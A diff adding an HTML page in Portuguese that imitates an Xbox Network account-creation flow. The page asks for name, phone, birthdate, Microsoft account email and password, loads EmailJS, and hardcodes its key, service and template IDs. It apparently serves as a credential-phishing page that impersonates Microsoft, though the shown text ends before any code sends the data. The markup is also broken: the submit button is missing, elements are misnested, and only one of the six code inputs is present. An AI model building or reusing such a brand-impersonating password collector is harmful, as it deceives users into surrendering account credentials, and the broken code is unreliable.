@@ -1,0 +1,933 @@
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Xbox — Criar conta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+ 
+    :root {
+      --bg:            #0a0a0a;
+      --bg2:           #0f0f0f;
+      --surface:       #141414;
+      --surface2:      #1a1a1a;
+      --surface3:      #202020;
+      --border:        rgba(255,255,255,0.06);
+      --border-hover:  rgba(255,255,255,0.12);
+      --border-focus:  rgba(82,176,67,0.55);
+      --accent:        #52B043;
+      --accent-dark:   #107C10;
+      --accent-light:  #6dcf5f;
+      --accent-glow:   rgba(82,176,67,0.15);
+      --text:          #f0f0f0;
+      --text-secondary:#a0a0a0;
+      --text-muted:    #5a5a5a;
+      --error:         #e53e3e;
+      --success:       #52B043;
+      --radius:        10px;
+      --radius-lg:     16px;
+      --transition:    0.2s cubic-bezier(0.4,0,0.2,1);
+    }
+ 
+    body {
+      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      position: relative;
+      overflow-x: hidden;
+    }
+ 
+    /* Subtle background texture */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        radial-gradient(ellipse 800px 600px at 50% -100px, rgba(82,176,67,0.07) 0%, transparent 70%),
+        radial-gradient(ellipse 400px 400px at 100% 100%, rgba(16,124,16,0.05) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: 0;
+    }
+ 
+    /* Dot grid */
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: radial-gradient(circle, rgba(255,255,255,0.025) 1px, transparent 1px);
+      background-size: 32px 32px;
+      pointer-events: none;
+      z-index: 0;
+    }
+  
+  
+    /* ── CARD ────────────────────────────────── */
+    .card {
+      position: relative; z-index: 1;
+      width: 100%; max-width: 460px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 36px 40px 40px;
+      box-shadow:
+        0 0 0 1px rgba(82,176,67,0.04),
+        0 4px 6px -1px rgba(0,0,0,0.4),
+        0 20px 60px -12px rgba(0,0,0,0.7),
+        0 0 80px -30px rgba(82,176,67,0.06);
+      opacity: 0;
+      transform: translateY(24px);
+    }
+    .card.ld-revealed {
+      animation: fadeUp 0.6s cubic-bezier(0.4,0,0.2,1) both;
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  
+  
+    /* ── TOP ACCENT LINE ─────────────────────── */
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 20px; right: 20px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent), transparent);
+      opacity: 0.6;
+      border-radius: 0 0 2px 2px;
+    }
+  
+  
+    /* ── LOGO ────────────────────────────────── */
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+    .logo-img {
+      width: 38px;
+      height: 38px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 8px rgba(82,176,67,0.3));
+    }
+    .logo-name {
+      font-size: 17px;
+      font-weight: 600;
+      color: var(--text);
+      letter-spacing: 0.02em;
+    }
+    .logo-badge {
+      margin-left: auto;
+      font-size: 10px;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent);
+      background: rgba(82,176,67,0.1);
+      border: 1px solid rgba(82,176,67,0.2);
+      padding: 3px 8px;
+      border-radius: 20px;
+    }
+  
+    /* ── STEPS ───────────────────────────────── */
+    .steps {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 22px;
+    }
+    .step-dot {
+      height: 3px;
+      flex: 1;
+      border-radius: 2px;
+      background: var(--surface3);
+      transition: var(--transition);
+    }
+    .step-dot.active {
+      background: var(--accent);
+      box-shadow: 0 0 8px rgba(82,176,67,0.4);
+    }
+    .step-dot.done {
+      background: var(--accent-dark);
+    }
+  
+    /* ── FORM HEADING ────────────────────────── */
+    .form-heading { margin-bottom: 22px; }
+    .form-heading h1 {
+      font-size: 20px;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+      color: var(--text);
+      margin-bottom: 5px;
+      line-height: 1.3;
+    }
+    .form-heading p {
+      font-size: 13.5px;
+      color: var(--text-secondary);
+      font-weight: 400;
+      line-height: 1.5;
+    }
+  
+    /* ── FIELDS ──────────────────────────────── */
+    .fields { display: flex; flex-direction: column; gap: 12px; }
+    .field  { display: flex; flex-direction: column; gap: 5px; }
+    .field label {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+ 
+    /* ── INPUT ───────────────────────────────── */
+    .input-wrap { position: relative; }
+    .input-wrap > svg {
+      position: absolute; left: 13px; top: 50%; transform: translateY(-50%);
+      width: 14px; height: 14px;
+      color: var(--text-muted);
+      pointer-events: none;
+      transition: color var(--transition);
+    }
+    input {
+      width: 100%;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-family: inherit;
+      font-size: 14px;
+      padding: 11px 13px 11px 38px;
+      outline: none;
+      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+      -webkit-appearance: none;
+    }
+    input[type="date"] { color-scheme: dark; }
+    input::placeholder { color: var(--text-muted); }
+    input:hover { border-color: var(--border-hover); background: var(--surface3); }
+    input:focus {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 0 3px rgba(82,176,67,0.1);
+      background: var(--surface2);
+    }
+    .input-wrap:has(input:focus) > svg { color: var(--accent); }
+    input.error { border-color: var(--error) !important; box-shadow: 0 0 0 3px rgba(229,62,62,0.1) !important; }
+  
+    /* Password toggle */
+    .pwd-toggle {
+      position: absolute; right: 11px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; color: var(--text-muted); cursor: pointer;
+      padding: 4px; display: flex; align-items: center;
+      transition: color var(--transition);
+    }
+    .pwd-toggle:hover { color: var(--text); }
+    .has-toggle input { padding-right: 38px; }
+  
+    /* Hint */
+    .field-hint {
+      font-size: 11.5px;
+      color: var(--error);
+      margin-top: 2px;
+      display: none;
+      padding-left: 2px;
+    }
+    .field-hint.show { display: block; }
+  
+    /* ── DIVIDER ─────────────────────────────── */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 4px 0;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+    .divider span {
+      font-size: 11px;
+      color: var(--text-muted);
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+ 
+    /* ── BUTTON ──────────────────────────────── */
+    .btn-primary {
+      width: 100%;
+      margin-top: 6px;
+      padding: 12px 20px;
+      background: var(--accent);
+      border: none;
+      border-radius: var(--radius);
+      color: #fff;
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: background var(--transition), transform var(--transition), box-shadow var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 14px rgba(82,176,67,0.25);
+    }
+    .btn-primary::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(255,255,255,0.08) 0%, transparent 100%);
+      pointer-events: none;
+    }
+    .btn-primary:hover {
+      background: var(--accent-light);
+      box-shadow: 0 6px 20px rgba(82,176,67,0.35);
+      transform: translateY(-1px);
+    }
+    .btn-primary:active { transform: scale(0.98) translateY(0); }
+    .btn-primary:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; transform: none; }
+ 
+    .spinner {
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: none;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .btn-primary.loading .spinner { display: block; }
+    .btn-primary.loading .btn-text { display: none; }
+  
+    /* ── SCREENS ─────────────────────────────── */
+    .screen { display: none; animation: fadeUp 0.3s cubic-bezier(0.4,0,0.2,1) both; }
+    .screen.active { display: block; }
+  
+    /* ── VERIFY SCREEN ───────────────────────── */
+    .verify-icon {
+      width: 60px; height: 60px;
+      background: var(--accent-glow);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 18px;
+      border: 1px solid rgba(82,176,67,0.25);
+    }
+    .verify-icon svg { width: 26px; height: 26px; color: var(--accent); }
+    .verify-center { text-align: center; }
+    .verify-center h1 {
+      font-size: 20px; font-weight: 600; margin-bottom: 8px; letter-spacing: -0.3px;
+    }
+    .verify-center p {
+      font-size: 13.5px; color: var(--text-secondary); line-height: 1.65; margin-bottom: 24px;
+    }
+    .verify-center p strong { color: var(--text); font-weight: 500; }
+  
+  
+  
+  
+    /* OTP code inputs */
+    .code-inputs {
+      display: flex; gap: 8px;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .code-inputs input {
+      width: 50px; height: 56px;
+      text-align: center;
+      font-size: 22px; font-weight: 700;
+      padding: 0;
+      border-radius: 10px;
+      letter-spacing: 0;
+      background: var(--surface2);
+    }
+  
+    .resend-row {
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-top: 18px;
+      text-align: center;
+    }
+    .resend-row button {
+      background: none; border: none;
+      color: var(--accent);
+      cursor: pointer;
+      font-family: inherit; font-size: 13px;
+      padding: 0; font-weight: 500;
+      transition: color var(--transition);
+    }
+    .resend-row button:hover { color: var(--accent-light); }
+    .resend-row button:disabled { color: var(--text-muted); cursor: default; }
+  
+    /* ── SUCCESS ─────────────────────────────── */
+    .success-center { text-align: center; padding: 6px 0; }
+    .success-icon {
+      width: 68px; height: 68px;
+      background: rgba(82,176,67,0.1);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 18px;
+      border: 1px solid rgba(82,176,67,0.25);
+      animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    .success-icon svg { width: 30px; height: 30px; color: var(--accent); }
+    .success-center h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; letter-spacing: -0.3px; }
+    .success-center p { font-size: 13.5px; color: var(--text-secondary); line-height: 1.65; margin-bottom: 24px; }
+ 
+    /* ── BACK LINK ───────────────────────────── */
+    .back-link {
+      text-align: center;
+      margin-top: 18px;
+      font-size: 12.5px;
+      color: var(--text-muted);
+    }
+    .back-link button {
+      background: none; border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      font-family: inherit; font-size: 12.5px; font-weight: 400;
+      transition: color var(--transition);
+      padding: 0;
+    }
+    .back-link button:hover { color: var(--text); }
+ 
+    /* ── FOOTER ──────────────────────────────── */
+    .card-footer {
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+      font-size: 12px;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.6;
+    }
+    .card-footer a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      transition: color var(--transition);
+    }
+    .card-footer a:hover { color: var(--accent); }
+ 
+    /* ── RESPONSIVE ──────────────────────────── */
+    @media (max-width: 480px) {
+      .card { padding: 28px 22px 32px; }
+      .field-row { grid-template-columns: 1fr; }
+      .code-inputs input { width: 42px; height: 48px; font-size: 18px; }
+    }
+ 
+    /* ══════════════════════════════════════════════════════════════
+       LOADING SCREEN
+    ══════════════════════════════════════════════════════════════ */
+ 
+    /* Theme tokens — dark (default) */
+    :root {
+      --ld-bg:        #0a0a0a;
+      --ld-ring1:     rgba(82,176,67,0.55);
+      --ld-ring2:     rgba(82,176,67,0.24);
+      --ld-ring3:     rgba(82,176,67,0.09);
+      --ld-glow-top:  rgba(82,176,67,0.08);
+      --ld-text:      rgba(240,240,240,0.92);
+      --ld-sub:       rgba(240,240,240,0.22);
+      --ld-bar:       #52B043;
+      --ld-bar-glow:  rgba(82,176,67,0.55);
+      --ld-dot:       rgba(255,255,255,0.022);
+      --ld-logo-f:    drop-shadow(0 0 16px rgba(82,176,67,0.7))
+                      drop-shadow(0 0 36px rgba(82,176,67,0.35));
+    }
+ 
+    /* Theme tokens — light */
+    @media (prefers-color-scheme: light) {
+      :root {
+        --ld-bg:        #ededed;
+        --ld-ring1:     rgba(15,15,15,0.46);
+        --ld-ring2:     rgba(15,15,15,0.19);
+        --ld-ring3:     rgba(15,15,15,0.07);
+        --ld-glow-top:  rgba(0,0,0,0.06);
+        --ld-text:      rgba(10,10,10,0.88);
+        --ld-sub:       rgba(10,10,10,0.24);
+        --ld-bar:       #1c1c1c;
+        --ld-bar-glow:  rgba(0,0,0,0.35);
+        --ld-dot:       rgba(0,0,0,0.038);
+        --ld-logo-f:    brightness(0)
+                        drop-shadow(0 0 14px rgba(0,0,0,0.38));
+      }
+    }
+ 
+    /* ── Overlay ── */
+    #xbox-loader {
+      position: fixed; inset: 0; z-index: 9999;
+      background: var(--ld-bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 30px;
+      overflow: hidden;
+    }
+ 
+    /* dot-grid texture */
+    #xbox-loader::before {
+      content: '';
+      position: absolute; inset: 0;
+      background-image: radial-gradient(circle, var(--ld-dot) 1px, transparent 1px);
+      background-size: 32px 32px;
+      pointer-events: none;
+    }
+  
+  
+  
+  
+    /* ambient radial glow from top */
+    #xbox-loader::after {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse 72% 48% at 50% 0%,
+        var(--ld-glow-top) 0%, transparent 65%);
+      pointer-events: none;
+    }
+ 
+    /* ── Exit animation ── */
+    #xbox-loader.ld-exit {
+      animation: ldExit 0.8s cubic-bezier(0.55, 0, 1, 0.45) forwards;
+      pointer-events: none;
+    }
+    @keyframes ldExit {
+      0%   { opacity: 1; transform: scale(1); }
+      30%  { opacity: 1; transform: scale(1.04); }
+      100% { opacity: 0; transform: scale(1.10); }
+    }
+  
+    /* ── Rings container ── */
+    .ld-rings {
+      position: relative;
+      width: 190px; height: 190px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+ 
+    .ld-ring {
+      position: absolute; border-radius: 50%;
+      animation: ringBreath 2.5s cubic-bezier(0.45, 0, 0.55, 1) infinite;
+    }
+    .ld-ring-1 {
+      width: 94px;  height: 94px;
+      background: radial-gradient(circle,
+        var(--ld-ring1) 0%,
+        var(--ld-ring2) 48%,
+        transparent 72%);
+      animation-delay: 0s;
+    }
+    .ld-ring-2 {
+      width: 140px; height: 140px;
+      background: radial-gradient(circle,
+        var(--ld-ring2) 0%,
+        var(--ld-ring3) 52%,
+        transparent 74%);
+      animation-delay: 0.38s;
+    }
+    .ld-ring-3 {
+      width: 205px; height: 205px;
+      background: radial-gradient(circle,
+        var(--ld-ring3) 0%,
+        transparent 66%);
+      animation-delay: 0.76s;
+    }
+    @keyframes ringBreath {
+      0%, 100% { opacity: 0.32; transform: scale(0.80); }
+      50%       { opacity: 1;    transform: scale(1.10); }
+    }
+ 
+    /* ── Logo ── */
+    .ld-logo {
+      position: relative; z-index: 2;
+      width: 78px; height: 78px;
+      object-fit: contain;
+      filter: var(--ld-logo-f);
+      animation: logoBreath 2.5s cubic-bezier(0.45, 0, 0.55, 1) infinite;
+    }
+    @keyframes logoBreath {
+      0%, 100% { transform: scale(0.92); }
+      50%       { transform: scale(1.09); }
+    }
+ 
+    /* ── Brand label ── */
+    .ld-brand {
+      text-align: center;
+      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+      animation: ldFadeUp 0.7s cubic-bezier(0.4, 0, 0.2, 1) 0.45s both;
+    }
+    .ld-brand-name {
+      display: block;
+      font-size: 20px; font-weight: 700;
+      letter-spacing: 0.38em;
+      color: var(--ld-text);
+      text-transform: uppercase;
+      text-indent: 0.38em; /* compensate letter-spacing on last char */
+    }
+    .ld-brand-sub {
+      display: block;
+      font-size: 10px; font-weight: 500;
+      letter-spacing: 0.52em;
+      color: var(--ld-sub);
+      text-transform: uppercase;
+      margin-top: 5px;
+      text-indent: 0.52em;
+    }
+    @keyframes ldFadeUp {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+ 
+    /* ── Progress bar ── */
+    .ld-bar-wrap {
+      position: absolute; bottom: 38px;
+      left: 50%; transform: translateX(-50%);
+      width: 200px;
+      animation: ldFadeUp 0.6s cubic-bezier(0.4, 0, 0.2, 1) 0.65s both;
+    }
+    .ld-bar-track {
+      height: 2px;
+      background: rgba(128,128,128,0.13);
+      border-radius: 2px;
+      overflow: hidden;
+      position: relative;
+    }
+    .ld-bar-fill {
+      position: absolute; inset-block: 0; left: 0;
+      width: 0%; border-radius: 2px;
+      background: var(--ld-bar);
+      box-shadow: 0 0 9px var(--ld-bar-glow);
+      animation: ldBarFill 2.55s cubic-bezier(0.4, 0, 0.2, 1) 0.2s forwards;
+    }
+    @keyframes ldBarFill {
+      0%   { width:  0%; }
+      12%  { width: 16%; }
+      38%  { width: 50%; }
+      65%  { width: 76%; }
+      88%  { width: 92%; }
+      100% { width: 100%; }
+    }
+ 
+    /* Chaser glow on bar head */
+    .ld-bar-fill::after {
+      content: '';
+      position: absolute; right: 0; top: -2px;
+      width: 10px; height: 6px;
+      border-radius: 50%;
+      background: var(--ld-bar);
+      opacity: 0.9;
+      filter: blur(3px);
+    }
+  </style>
+  </head>
+  <body>
+ 
+<!-- ══ LOADING SCREEN ══════════════════════════════════════════ -->
+<div id="xbox-loader" aria-hidden="true" role="presentation">
+  <!-- three breathing glow rings + logo -->
+  <div class="ld-rings">
+    <div class="ld-ring ld-ring-3"></div>
+    <div class="ld-ring ld-ring-2"></div>
+    <div class="ld-ring ld-ring-1"></div>
+    <img src="xbox-logo.png" class="ld-logo" alt="Xbox" draggable="false">
+  </div>
+
+  <!-- brand name -->
+  <div class="ld-brand">
+    <span class="ld-brand-name">Xbox</span>
+    <span class="ld-brand-sub">Network</span>
+  </div>
+
+  <!-- slim progress bar anchored to bottom -->
+  <div class="ld-bar-wrap">
+    <div class="ld-bar-track">
+      <div class="ld-bar-fill"></div>
+    </div>
+  </div>
+</div>
+<!-- ══════════════════════════════════════════════════════════ -->
+  
+  <div class="card">
+ 
+    <!-- LOGO -->
+    <div class="logo">
+      <img src="xbox-logo.png" alt="Xbox" class="logo-img">
+      <span class="logo-name">Xbox Network</span>
+      <span class="logo-badge">PT-BR</span>
+    </div>
+  
+    <!-- ══ TELA 1: CADASTRO ══════════════════ -->
+    <div id="screen-register" class="screen active">
+      <div class="steps">
+        <div class="step-dot active" id="dot-1"></div>
+        <div class="step-dot" id="dot-2"></div>
+        <div class="step-dot" id="dot-3"></div>
+      </div>
+ 
+      <div class="form-heading">
+        <h1>Crie sua conta Xbox</h1>
+        <p>Preencha seus dados para começar a jogar</p>
+      </div>
+  
+      <div class="fields">
+ 
+          <div class="field">
+            <label>Nome completo</label>
+            <div class="input-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
+              </svg>
+              <input type="text" id="reg-nome" placeholder="João Silva" autocomplete="name">
+            </div>
+            <span class="field-hint" id="h-nome">Campo obrigatório</span>
+          </div>
+          <div class="field">
+            <label>Gamertag</label>
+            <div class="input-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M11 4a2 2 0 114 0v1a1 1 0 001 1h3a1 1 0 011 1v3a1 1 0 01-1 1h-1a2 2 0 100 4h1a1 1 0 011 1v3a1 1 0 01-1 1h-3a1 1 0 01-1-1v-1a2 2 0 10-4 0v1a1 1 0 01-1 1H7a1 1 0 01-1-1v-3a1 1 0 00-1-1H4a2 2 0 110-4h1a1 1 0 001-1V7a1 1 0 011-1h3a1 1 0 001-1V4z"/>
+              </svg>
+              <input type="text" id="reg-user" placeholder="xXGamer99Xx" autocomplete="username">
+            </div>
+            <span class="field-hint" id="h-user">Campo obrigatório</span>
+          </div>
+ 
+          <div class="field">
+            <label>Telefone</label>
+            <div class="input-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/>
+              </svg>
+              <input type="tel" id="reg-tel" placeholder="(11) 99999-9999" autocomplete="tel">
+            </div>
+            <span class="field-hint" id="h-tel">Campo obrigatório</span>
+          </div>
+          <div class="field">
+            <label>Nascimento</label>
+            <div class="input-wrap">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/>
+              </svg>
+              <input type="date" id="reg-nasc" autocomplete="bday">
+            </div>
+            <span class="field-hint" id="h-nasc">Campo obrigatório</span>
+          </div>
+        </div>
+  
+        <div class="field">
+          <label>Email da conta Microsoft</label>
+          <div class="input-wrap">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
+            </svg>
+            <input type="email" id="reg-email" placeholder="seu@email.com" autocomplete="email">
+          </div>
+          <span class="field-hint" id="h-email">Digite um email válido</span>
+        </div>
+ 
+        <div class="field">
+          <label>Senha</label>
+          <div class="input-wrap has-toggle">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+            </svg>
+            <input type="password" id="reg-senha" placeholder="Mínimo 8 caracteres" autocomplete="new-password">
+            <button class="pwd-toggle" onclick="togglePwd('reg-senha',this)" tabindex="-1" aria-label="Mostrar senha">
+              <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+              </svg>
+            </button>
+          </div>
+          <span class="field-hint" id="h-senha">Mínimo 8 caracteres</span>
+ 
+        <div class="field">
+          <label>Confirmar senha</label>
+          <div class="input-wrap has-toggle">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+            </svg>
+            <input type="password" id="reg-senha2" placeholder="Repita a senha" autocomplete="new-password">
+            <button class="pwd-toggle" onclick="togglePwd('reg-senha2',this)" tabindex="-1" aria-label="Mostrar senha">
+              <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+              </svg>
+            </button>
+          </div>
+          <span class="field-hint" id="h-senha2">As senhas não coincidem</span>
+ 
+            <div class="spinner"></div>
+          </button>
+        </div>
+ 
+      <div class="card-footer">
+        Ao criar uma conta, você concorda com os <a href="#">Termos de Serviço</a> e a <a href="#">Política de Privacidade</a> do Xbox.
+      </div>
+    </div>
+  
+    <!-- ══ TELA 2: VERIFICAÇÃO ════════════════ -->
+    <div id="screen-verify" class="screen">
+      <div class="steps">
+        <div class="step-dot done"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot" id="dot-3b"></div>
+      </div>
+ 
+      <div class="verify-center">
+        <div class="verify-icon">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.6">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
+          </svg>
+        </div>
+        <h1>Verifique seu email</h1>
+        <p>Enviamos um código de 6 dígitos para<br><strong id="verify-email-show"></strong></p>
+        <p id="email-status" style="font-size:12.5px;margin-top:-14px;margin-bottom:20px;line-height:1.5;"></p>
+  
+        <div class="code-inputs" id="code-inputs">
+          <input type="text" maxlength="1" inputmode="numeric" oninput="codeInput(this,0)" onkeydown="codeKey(event,0)">
+ 
+        </div>
+        <span class="field-hint" id="hint-code" style="display:none;text-align:center;margin-bottom:12px;">Código incorreto. Tente novamente.</span>
+  
+        <button class="btn-primary" id="btn-verify" onclick="doVerify()" style="margin-top:12px;">
+          <span class="btn-text">Confirmar código</span>
+          <div class="spinner"></div>
+        </button>
+ 
+      </div>
+    </div>
+  
+    <!-- ══ TELA 3: SUCESSO ════════════════════ -->
+    <div id="screen-success" class="screen">
+      <div class="steps">
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot active"></div>
+      </div>
+ 
+      <div class="success-center">
+        <div class="success-icon">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+        </div>
+        <h1>Conta criada com sucesso!</h1>
+        <p>Seu email foi verificado. Bem-vindo à Xbox Network, <strong id="success-name"></strong>! Prepare-se para jogar.</p>
+        <button class="btn-primary" style="margin-top:0" onclick="alert('Redirecionando para o Xbox...')">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M4.102 21.033C6.211 22.881 8.977 24 12 24c6.627 0 12-5.373 12-12S18.627 0 12 0a11.973 11.973 0 00-8.093 3.152c.197.523.522 1.113 1.018 1.71.943 1.12 2.613 2.408 5.454 3.122-1.301.52-2.287 1.44-2.287 1.44s-1.617-1.21-3.088-1.618c-.83-.23-1.574-.22-2.168-.084A11.934 11.934 0 000 12c0 3.58 1.575 6.8 4.075 9.01.103-.47.23-.99.395-1.45.517-1.457 1.43-2.65 2.77-3.61L4.102 21.033zM11.998 2.688c1.79 0 3.24 1.275 3.24 2.845 0 .44-.11.864-.304 1.25C13.79 5.888 12.906 5.28 12 5.28c-.94 0-1.854.63-2.985 1.517a2.808 2.808 0 01-.258-1.264c0-1.57 1.45-2.845 3.24-2.845z"/>
+          </svg>
+          <span class="btn-text">Acessar o Xbox</span>
+          <div class="spinner"></div>
+        </button>
+      </div>
+    </div>
+ 
+  </div>
+  
+  <script>
+    /* ── Loading screen controller ─────────────────────────────── */
+    (function () {
+      var T0      = performance.now();
+      var MIN_MS  = 2750; // minimum display time in ms
+ 
+      function dismiss() {
+        var elapsed  = performance.now() - T0;
+        var wait     = Math.max(0, MIN_MS - elapsed);
+ 
+        setTimeout(function () {
+          var loader = document.getElementById('xbox-loader');
+          var card   = document.querySelector('.card');
+ 
+          /* Start loader fade-out */
+          loader.classList.add('ld-exit');
+  
+          /* Reveal card 130 ms after loader starts exiting */
+          setTimeout(function () {
+            card.classList.add('ld-revealed');
+          }, 130);
+ 
+          /* Remove loader from layout after animation completes */
+          setTimeout(function () {
+            loader.style.display = 'none';
+          }, 880);
+        }, wait);
+      }
+ 
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', dismiss);
+      } else {
+        dismiss();
+      }
+    }());
+    /* ─────────────────────────────────────────────────────────── */
+ 
+    emailjs.init('sqNAEDZ9EFz9_Ked3');
+    const SERVICE_ID  = 'service_r0q6wrc';
+    const TEMPLATE_ID = 'template_dafe72a';
+  
+    let verificationCode = '';
+    let userEmail = '';
+    let userName  = '';
+  
+    function generateCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+ 
